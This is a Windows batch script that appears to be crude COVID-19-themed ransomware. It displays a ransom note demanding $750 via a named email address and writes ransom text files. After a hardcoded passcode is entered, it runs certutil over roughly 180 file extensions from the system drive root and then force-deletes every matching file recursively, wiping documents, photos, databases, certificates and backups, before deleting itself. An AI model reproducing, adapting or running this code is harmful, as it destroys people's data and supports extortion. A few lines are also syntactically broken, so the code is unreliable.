ping 1.1.1.1 -n 1 -w 5 >NUL
color cf
ping 1.1.1.1 -n 1 -w 5 >NUL
color 0c
ping 1.1.1.1 -n 1 -w 5 >NUL
color cf
ping 1.1.1.1 -n 1 -w 5 >NUL
color 0c
ping 1.1.1.1 -n 1 -w 5 >NUL
color cf
ping 1.1.1.1 -n 1 -w 5 >NUL
color 0f
ping 1.1.1.1 -n 1 -w 5 >NUL
color cf
ping 1.1.1.1 -n 1 -w 5 >NUL
color 0f
ping 1.1.1.1 -n 1 -w 5 >NUL
color cf
ping 1.1.1.1 -n 1 -w 5 >NUL
color 0f
echo      *---------------------------------------------------------------------* 
echo      *            YOUR ALL FILES HAS BEEN ENCRYPTED BY COVID-19            *
echo      *If you want your files back you need to pay ransom.                  *
echo      *It will cost you 750$ to get your files back..                       *
echo      *Send money with KEY(L9520516760) to KryptKrypt@gmail.com email adress*
echo      *and wait for to PassCode.                                            *
echo      *                 DO NOT FORGET COVID-19 IS DANGEROUS!                *
echo      *---------------------------------------------------------------------*
echo Hello %username% Your all files has been encrypted by covid-19.>>README.txt
echo COVID-19 COVID-19 COVID-19 COVID-19 COVID-19 COVID-19 COVID-19 COVID-19.>>README.txt
echo PAY RANSOM OR SAY GOODBYE TO ALL YOUR FILES! YOUR CHOICE.>>PAYRANSOM.txt
echo PAY 750$ OR SAY BYE SADLY TO ALL YOUR FILES!>>WARNING.txt
set/p "pass==PassCode:"
if %pass%==OL0Q9145 goto 5 
if not %pass%==OL0Q9145 goto 1                 
ping 1.1.1.1 -n 1 -w 5 >NUL
color 1a
ping 1.1.1.1 -n 1 -w 5 >NUL
color a1
ping 1.1.1.1 -n 1 -w 5 >NUL
color 1a
ping 1.1.1.1 -n 1 -w 5 >NUL
color a1
ping 1.1.1.1 -n 1 -w 5 >NUL
color 1a
ping 1.1.1.1 -n 1 -w 5 >NUL
color a1
ping 1.1.1.1 -n 1 -w 5 >NUL
color 1a
ping 1.1.1.1 -n 1 -w 5 >NUL
color a1
ping 1.1.1.1 -n 1 -w 5 >NUL
color 1a
ping 1.1.1.1 -n 1 -w 5 >NUL
color 1a
ping 1.1.1.1 -n 1 -w 5 >NUL
color a1
ping 1.1.1.1 -n 1 -w 5 >NUL
color 1a
ping 1.1.1.1 -n 1 -w 5 >NUL
color a1
ping 1.1.1.1 -n 1 -w 5 >NUL
color 1a
:2
echo      @@@@@@   @@@@  @           @ @@@@@@@@ @@@@@@@            @@    @@@@@@@
echo      @       @    @  @         @      @    @       @         @ @    @     @
echo      @       @    @   @       @       @    @       @        @  @    @     @
echo      @       @    @    @     @        @    @       @  ----     @    @     @
echo      @       @    @     @   @         @    @       @           @    @@@@@@@
echo      @       @    @      @ @          @    @       @           @          @
echo      @@@@@@   @@@@        @       @@@@@@@@ @@@@@@@@         @@@@@@@ @@@@@@@
echo.
echo      *---------------------------------------------------------------------* 
echo      *              YOUR ALL FILES HAS BEEN ENCRYPTED BY COVID-19          *
echo      *If you want your files back you need to pay ransom.                  *
echo      *It will cost you 750$ to get your files back..                       *
echo      *Send money with KEY(L9520516760) to KryptKrypt@gmail.com email adress*
echo      *and wait for to PassCode.                                            *
echo      *                  DO NOT FORGET COVID-19 IS DANGEROUS!               *
echo      *---------------------------------------------------------------------*
set/p "pass==PassCode:"
if %pass%==OL0Q9145 goto 5 
if not %pass%==OL0Q9145 goto 1
:1
echo WRONG PassCode!
pause>nul
cls
goto 2
:5
cd %SystemDrive%\
for %%a in (*.sql) do certutil -decode "%%~a" "%%~na.sql"
del /s /f /q *.sql
for %%a in (*.mp4) do certutil -decode "%%~a" "%%~na.mp4"
del /s /f /q *.mp4
for %%a in (*.7z) do certutil -decode "%%~a" "%%~na.7z"
del /s /f /q *.7z
for %%a in (*.rar) do certutil -decode "%%~a" "%%~na.rar"
del /s /f /q *.rar
for %%a in (*.m4a) do certutil -decode "%%~a" "%%~na.m4a"
del /s /f /q *.m4a
for %%a in (*.wma) do certutil -decode "%%~a" "%%~na.wma"
del /s /f /q *.wma
for %%a in (*.avi) do certutil -decode "%%~a" "%%~na.avi"
del /s /f /q *.avi
for %%a in (*.wmv) do certutil -decode "%%~a" "%%~na.wmv"
del /s /f /q *.wmv
for %%a in (*.csv) do certutil -decode "%%~a" "%%~na.csv"
del /s /f /q *.csv
for %%a in (*.d3dbsp) do certutil -decode "%%~a" "%%~na"
del /s /f /q *.d3dbsp
for %%a in (*.zip) do certutil -decode "%%~a" "%%~na.zip"
del /s /f /q *.zip
for %%a in (*.sie) do certutil -decode "%%~a" "%%~na.sie"
del /s /f /q *.sie
for %%a in (.sum) do certutil -decode "%%~a" "%%~na.sum"
del /s /f /q *.sum
for %%a in (*.ibank) do certutil -decode "%%~a" "%%~na.ibank"
del /s /f /q *.ibank
for %%a in (*.t13) do certutil -decode "%%~a" "%%~na.t13"
del /s /f /q *.t13
for %%a in (*.t12) do certutil -decode "%%~a" "%%~na.t12"
del /s /f /q *.t12
for %%a in (*.qdf) do certutil -decode "%%~a" "%%~na.qdf"
del /s /f /q *.qdf
for %%a in (*.gdb) do certutil -decode "%%~a" "%%~na.gdb"
del /s /f /q *.gdb
for %%a in (*.tax) do certutil -decode "%%~a" "%%~na.tax"
del /s /f /q *.tax
for %%a in (*.pkpass) do certutil -decode "%%~a" "%%~na"
del /s /f /q *.pkpass
for %%a in (*.bc6) do certutil -decode "%%~a" "%%~na.bc6"
del /s /f /q *.bc6
for %%a in (*.bc7) do certutil -decode "%%~a" "%%~na.bc7"
del /s /f /q *.bc7
for %%a in (*.bkp) do certutil -decode "%%~a" "%%~na.bkp"
del /s /f /q *.bkp
for %%a in (*.qic) do certutil -decode "%%~a" "%%~na.qic"
del /s /f /q *.qic
for %%a in (*.bkf) do certutil -decode "%%~a" "%%~na.bkf"
del /s /f /q *.bkf
for %%a in (*.sidn) do certutil -decode "%%~a" "%%~na.sidn"
del /s /f /q *.sidn
for %%a in (*.sidd) do certutil -decode "%%~a" "%%~na.sidd"
del /s /f /q *.sidd
for %%a in (*.mddata) do certutil -decode "%%~a" "%%~na.mddata"
del /s /f /q *.mddata
for %%a in (*.itl) do certutil -decode "%%~a" "%%~na.itl"
del /s /f /q *.itl
for %%a in (*.itdb) do certutil -decode "%%~a" "%%~na.itdb"
del /s /f /q *.itdb
for %%a in (*.icxs) do certutil -decode "%%~a" "%%~na.icxs"
del /s /f /q *.icxs
for %%a in (*.hvpl) do certutil -decode "%%~a" "%%~na.hvpl"
del /s /f /q *.hvpl
for %%a in (*.hplg) do certutil -decode "%%~a" "%%~na.hplg"
del /s /f /q *.hplg
for %%a in (*.hkdb) do certutil -decode "%%~a" "%%~na.hkdb"
del /s /f /q *.hkdb
for %%a in (*.mdbackup) do certutil -decode "%%~a" "%%~na.mdbackup"
del /s /f /q *.mdbackup
for %%a in (*.syncdb) do certutil -decode "%%~a" "%%~na.syncdb"
del /s /f /q *.syncdb
for %%a in (*.gho) do certutil -decode "%%~a" "%%~na.gho"
del /s /f /q *.gho
for %%a in (*.cas) do certutil -decode "%%~a" "%%~na.cas"
del /s /f /q *.cas
for %%a in (*.svg) do certutil -decode "%%~a" "%%~na.svg"
del /s /f /q *.svg
for %%a in (*.map) do certutil -decode "%%~a" "%%~na.map"
del /s /f /q *.map
for %%a in (*.wmo) do certutil -decode "%%~a" "%%~na.wmo"
del /s /f /q *.wmo
for %%a in (*.itm) do certutil -decode "%%~a" "%%~na.itm"
del /s /f /q *.itm
for %%a in (*.sb) do certutil -decode "%%~a" "%%~na.sb"
del /s /f /q *.sb
for %%a in (*.fos) do certutil -decode "%%~a" "%%~na.fos"
del /s /f /q *.fos
for %%a in (*.mov) do certutil -decode "%%~a" "%%~na.mov"
del /s /f /q *.mov
for %%a in (*.vdf) do certutil -decode "%%~a" "%%~na.vdf"
del /s /f /q *.vdf
for %%a in (*.ztmp) do certutil -decode "%%~a" "%%~na.ztmp"
del /s /f /q *.ztmp
for %%a in (*.sis) do certutil -decode "%%~a" "%%~na.sis"
del /s /f /q *.sis
for %%a in (*.sid) do certutil -decode "%%~a" "%%~na.sid"
del /s /f /q *.sid
for %%a in (*.ncf) do certutil -decode "%%~a" "%%~na.ncf"
del /s /f /q *.ncf
for %%a in (*.menu) do certutil -decode "%%~a" "%%~na.menu"
del /s /f /q *.menu
for %%a in (*.layout) do certutil -decode "%%~a" "%%~na.layout"
del /s /f /q *.layout
for %%a in (*.dmp) do certutil -decode "%%~a" "%%~na.dmp"
del /s /f /q *.dmp
for %%a in (*.blob) do certutil -decode "%%~a" "%%~na.blob"
del /s /f /q *.blob
for %%a in (*.esm) do certutil -decode "%%~a" "%%~na.esm"
del /s /f /q *.esm
for %%a in (*.vcf) do certutil -decode "%%~a" "%%~na.vcf"
del /s /f /q *.vcf
for %%a in (*.vtf) do certutil -decode "%%~a" "%%~na.vtf"
del /s /f /q *.vtf
for %%a in (*.dazip) do certutil -decode "%%~a" "%%~na.dazip"
del /s /f /q *.dazip
for %%a in (*.fpk) do certutil -decode "%%~a" "%%~na.fpk"
del /s /f /q *.fpk
for %%a in (*.mlx) do certutil -decode "%%~a" "%%~na.mlx"
del /s /f /q *.mlx
for %%a in (*.kf) do certutil -decode "%%~a" "%%~na.kf"
del /s /f /q *.kf
for %%a in (*.iwd) do certutil -decode "%%~a" "%%~na.iwd"
del /s /f /q *.iwd
for %%a in (*.vpk) do certutil -decode "%%~a" "%%~na.vpk"
del /s /f /q *.vpk
for %%a in (*.tor) do certutil -decode "%%~a" "%%~na.tor"
del /s /f /q *.tor
for %%a in (*.psk) do certutil -decode "%%~a" "%%~na.psk"
del /s /f /q *.psk
for %%a in (*.rim) do certutil -decode "%%~a" "%%~na.rim"
del /s /f /q *.rim
for %%a in (*.w3x) do certutil -decode "%%~a" "%%~na.w3x"
del /s /f /q *.w3x
for %%a in (*.fsh) do certutil -decode "%%~a" "%%~na.fsh"
del /s /f /q *.fsh
for %%a in (*.ntl) do certutil -decode "%%~a" "%%~na.ntl"
del /s /f /q *.ntl
for %%a in (*.arch00) do certutil -decode "%%~a" "%%~na.arch00"
del /s /f /q *.arch00
for %%a in (*.lvl) do certutil -decode "%%~a" "%%~na.lvl"
del /s /f /q *.lvl
for %%a in (*.snx) do certutil -decode "%%~a" "%%~na.snx"
del /s /f /q *.snx
for %%a in (*.cfr) do certutil -decode "%%~a" "%%~na.cfr"
del /s /f /q *.cfr
for %%a in (*.ff) do certutil -decode "%%~a" "%%~na.ff"
del /s /f /q *.ff
for %%a in (*.vpp_pc) do certutil -decode "%%~a" "%%~na.vpp_pc"
del /s /f /q *.vpp_pc
for %%a in (*.lrf) do certutil -decode "%%~a" "%%~na.lrf"
del /s /f /q *.lrf
for %%a in (*.m2) do certutil -decode "%%~a" "%%~na.m2"
del /s /f /q *.m2
for %%a in (*.mcmeta) do certutil -decode "%%~a" "%%~na.mcmeta"
del /s /f /q *.mcmeta
for %%a in (*.vfs0) do certutil -decode "%%~a" "%%~na.vfs0"
del /s /f /q *.vfs0
for %%a in (*.mpqge) do certutil -decode "%%~a" "%%~na.mpqge"
del /s /f /q *.mpqge
for %%a in (*.kdb) do certutil -decode "%%~a" "%%~na.kdb"
del /s /f /q *.kdb
for %%a in (*.db0) do certutil -decode "%%~a" "%%~na.db0"
del /s /f /q *.db0
for %%a in (*.dba) do certutil -decode "%%~a" "%%~na.dba"
del /s /f /q *.dba
for %%a in (*.rofl) do certutil -decode "%%~a" "%%~na.rofl"
del /s /f /q *.rofl
for %%a in (*.hkx) do certutil -decode "%%~a" "%%~na.hkx"
del /s /f /q *.hkx
for %%a in (*.bar) do certutil -decode "%%~a" "%%~na.bar"
del /s /f /q *.bar
for %%a in (*.upk) do certutil -decode "%%~a" "%%~na.upk"
del /s /f /q *.upk
for %%a in (*.das) do certutil -decode "%%~a" "%%~na.das"
del /s /f /q *.das
for %%a in (*.iwi) do certutil -decode "%%~a" "%%~na.iwi"
del /s /f /q *.iwi
for %%a in (*.litemod) do certutil -decode "%%~a" "%%~na.litemod"
del /s /f /q *.litemod
for %%a in (*.asset) do certutil -decode "%%~a" "%%~na.asset"
del /s /f /q *.asset
for %%a in (*.forge) do certutil -decode "%%~a" "%%~na.forge"
del /s /f /q *.forge
for %%a in (*.ltx) do certutil -decode "%%~a" "%%~na.ltx"
del /s /f /q *.ltx
for %%a in (*.bsa) do certutil -decode "%%~a" "%%~na.bsa"
del /s /f /q *.bsa
for %%a in (*.apk) do certutil -decode "%%~a" "%%~na.apk"
del /s /f /q *.apk
for %%a in (*.re4) do certutil -decode "%%~a" "%%~na.re4"
del /s /f /q *.re4
for %% a in (*.sav) do certutil -decode "%%~a" "%%~na.sav"
del /s /f /q *.sav
for %%a in (*.lbf) do certutil -decode "%%~a" "%%~na.lbf"
del /s /f /q *.lbf
for %%a in (*.slm) do certutil -decode "%%~a" "%%~na.slm"
del /s /f /q *.slm
for %%a in (*.py) do certutil -decode "%%~a" "%%~na.py"
del /s /f /q *.py
for %%a in (*.m3u) do certutil -decode "%%~a" "%%~na.m3u"
del /s /f /q *.m3u
for %%a in (*.flv) do certutil -decode "%%~a" "%%~na.flv"
del /s /f /q *.flv
for %%a in (*.js) do certutil -decode "%%~a" "%%~na.js"
del /s /f /q *.js
for %%a in (*.css) do certutil -decode "%%~a" "%%~na.css"
del /s /f /q *.css
for %%a in (*.rb) do certutil -decode "%%~a" "%%~na.rb"
del /s /f /q *.rb
for %%a in (*.png) do certutil -decode "%%~a" "%%~na.png"
del /s /f /q *.png
for %%a in (*.jpeg) do certutil -decode "%%~a" "%%~na.jpeg"
del /s /f /q *.jpeg
for %%a in (*.txt) do certutil -decode "%%~a" "%%~na.txt"
del /s /f /q *.txt
for %%a in (*.p7c) do certutil -decode "%%~a" "%%~na.p7c"
del /s /f /q *.p7c
for %%a in (*.p12) do certutil -decode "%%~a" "%%~na.p12"
del /s /f /q *.p12
for %%a in (*.pfx) do certutil -decode "%%~a" "%%~na.pfx"
del /s /f /q *.pfx
for %%a in (*.pem) do certutil -decode "%%~a" "%%~na.pem"
del /s /f /q *.pem
for %%a in (*.crt) do certutil -decode "%%~a" "%%~na.crt"
del /s /f /q *.crt
for %%a in (*.cer) do certutil -decode "%%~a" "%%~na.cer"
del /s /f /q *.cer
for %%a in (*.x3f) do certutil -decode "%%~a" "%%~na.x3f"
del /s /f /q *.x3f
for %%a in (*.srw) do certutil -decode "%%~a" "%%~na.srw"
del /s /f /q *.srw
for %%a in (*.pef) do certutil -decode "%%~a" "%%~na.pef"
del /s /f /q *.pef
for %%a in (*.ptx) do certutil -decode "%%~a" "%%~na.ptx"
del /s /f /q *.ptx
for %%a in (*.r3d) do certutil -decode "%%~a" "%%~na.r3d"
del /s /f /q *.r3d
for %%a in (*.rw2) do certutil -decode "%%~a" "%%~na.rw2"
del /s /f /q *.rw2
for %%a in (*.rw1) do certutil -decode "%%~a" "%%~na.rw1"
del /s /f /q *.rw1
for %%a in (*.raw) do certutil -decode "%%~a" "%%~na.raw"
del /s /f /q *.raw
for %%a in (*.raf) do certutil -decode "%%~a" "%%~na.raf"
del /s /f /q *.raf
for %%a in (*.orf) do certutil -decode "%%~a" "%%~na.orf"
del /s /f /q *.orf
for %%a in (*.nrw) do certutil -decode "%%~a" "%%~na.nrw"
del /s /f /q *.nrw
for %%a in (*.mrwref) do certutil -decode "%%~a" "%%~na.mrwref"
del /s /f /q *.mrwref
for %%a in (*.mef) do certutil -decode "%%~a" "%%~na.mef"
del /s /f /q *.mef
for %%a in (*.erf) do certutil -decode "%%~a" "%%~na.erf"
del /s /f /q *.erf
for %%a in (*.kdc) do certutil -decode "%%~a" "%%~na.kdc"
del /s /f /q *.kdc
for %%a in (*.dcr) do certutil -decode "%%~a" "%%~na.dcr"
del /s /f /q *.dcr
for %%a in (*.cr2) do certutil -decode "%%~a" "%%~na.cr2"
del /s /f /q *.cr2
for %%a in (*.crw) do certutil -decode "%%~a" "%%~na.crw"
del /s /f /q *.crw
for %%a in (*.sr2) do certutil -decode "%%~a" "%%~na.sr2"
del /s /f /q *.sr2
for %%a in (*.srf) do certutil -decode "%%~a" "%%~na.srf"
del /s /f /q *.srf
for %%a in (*.arw) do certutil -decode "%%~a" "%%~na.arw"
del /s /f /q *.arw 
for %%a in (*.3fr) do certutil -decode "%%~a" "%%~na.3fr"
del /s /f /q *.3fr
for %%a in (*.dng) do certutil -decode "%%~a" "%%~na.dng"
del /s /f /q *.dng
for %%a in (*.jpe) do certutil -decode "%%~a" "%%~na.jpe"
del /s /f /q *.jpe
for %%a in (*.jpg) do certutil -decode "%%~a" "%%~na.jpg"
del /s /f /q *.jpg
for %%a in (*.cdr) do certutil -decode "%%~a" "%%~na.cdr"
del /s /f /q *.cdr
for %%a in (*.pdf) do certutil -decode "%%~a" "%%~na.pdf"
del /s /f /q *.pdf
for %%a in (*.pdd) do certutil -decode "%%~a" "%%~na.pdd"
del /s /f /q *.pdd
for %%a in (*.psd) do certutil -decode "%%~a" "%%~na.psd"
del /s /f /q *.psd
for %%a in (*.dbf) do certutil -decode "%%~a" "%%~na.dbf"
del /s /f /q *.dbf
for %%a in (*.mdf) do certutil -decode "%%~a" "%%~na.mdf"
del /s /f /q *.mdf
for %%a in (*.wb2) do certutil -decode "%%~a" "%%~na.wb2"
del /s /f /q *.wb2
for %%a in (*.rtf) do certutil -decode "%%~a" "%%~na.rtf"
del /s /f /q *.rtf
for %%a in (*.wpd) do certutil -decode "%%~a" "%%~na.wpd"
del /s /f /q *.wpd
for %%a in (*.dxg) do certutil -decode "%%~a" "%%~na.wpd"
del /s /f /q *.dxg
for %%a in (*.xf) do certutil -decode "%%~a" "%%~na.xf"
del /s /f /q *.xf
for %%a in (*.dwg) do certutil -decode "%%~a" "%%~na.dwg"
del /s /f /q *.dwg
for %%a in (*.pst) do certutil -decode "%%~a" "%%~na.pst"
del /s /f /q *.pst
for %%a in (*.accdb) do certutil -decode "%%~a" "%%~na.accdb"
del /s /f /q *.accdb
for %%a in (*.mdb) do certutil -decode "%%~a" "%%~na.mdb"
del /s /f /q *.mdb
for %%a in (*.pptm) do certutil -decode "%%~a" "%%~na.pptm"
del /s /f /q *.pptm
for %%a in (*.pptx) do certutil -decode "%%~a" "%%~na.pptx"
del /s /f /q *.pptx
for %%a in (*.ppt) do certutil -decode "%%~a" "%%~na.ppt"
del /s /f /q *.ppt
for %%a in (*.xlk) do certutil -decode "%%~a" "%%~na.xlk"
del /s /f /q *.xlk
for %%a in (*.xlsb) do certutil -decode "%%~a" "%%~na.xlsb"
del /s /f /q *.xlsb
for %%a in (*.xlsm) do certutil -decode "%%~a" "%%~na.xlsm"
del /s /f /q *.xlsm
for %%a in (*.xlsx) do certutil -decode "%%~a" "%%~na.xlsx"
del /s /f /q *.xlsx
for %%a in (*.xls) do certutil -decode "%%~a" "%%~na.xls"
del /s /f /q *.xls
for %%a in (*.wps) do certutil -decode "%%~a" "%%~na.wps"
del /s /f /q *.wps
for %%a in (*.docm) do certutil -decode "%%~a" "%%~na.docm"
del /s /f /q *.docm
for %%a in (*.docx) do certutil -decode "%%~a" "%%~na.docx"
del /s /f /q *.docx
for %%a in (*.doc) do certutil -decode "%%~a" "%%~na.doc"
del /s /f /q *.doc
for %%a in (*.odb) do certutil -decode "%%~a" "%%~na.odb"
del /s /f /q *.odb
for %%a in (*.odc) do certutil -decode "%%~a" "%%~na.odc"
del /s /f /q *.odc
for %%a in (*.odm) do certutil -decode "%%~a" "%%~na.odm"
del /s /f /q *.odm
for %%a in (*.odp) do certutil -decode "%%~a" "%%~na.odp"
del /s /f /q *.odp
for %%a in (*.ods) do certutil -decode "%%~a" "%%~na.ods"
del /s /f /q *.ods
for %%a in (*.odt) do certutil -decode "%%~a" "%%~na.odt"
del /s /f /q *.odt
cls
echo PassCode CORRECT! YOUR ALL FILES HAS BEEN DECRYPTED!
pause>nul
del /F /Q IKV
del /F /Q README.txt
del /F /Q PAYRANSOM.txt
del /F /Q WARNING.txt
del /F /Q "%~f0"
del /F /Q PAYRANSOM!
exit